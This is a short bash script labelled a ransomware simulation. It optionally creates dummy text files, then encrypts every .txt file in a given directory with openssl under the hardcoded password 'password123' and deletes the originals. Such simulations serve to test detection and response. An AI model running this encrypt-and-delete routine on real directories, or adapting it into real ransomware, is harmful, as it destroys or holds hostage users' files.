#!/bin/bash
TARGET_DIR=$1
NUM_FILES=$2

if [ ! -z "$NUM_FILES" ]; then
    echo "Creating $NUM_FILES files in $TARGET_DIR..."
    for i in $(seq 1 $NUM_FILES); do
        echo "Data for file $i" > "$TARGET_DIR/file_$i.txt"
    done
fi

for f in "$TARGET_DIR"/*.txt; do
    if [ -f "$f" ]; then
        openssl enc -aes-256-cbc -salt -in "$f" -out "$f.enc" -pass pass:password123 -pbkdf2
        rm "$f"
    fi
done
echo "Ransomware simulation complete."
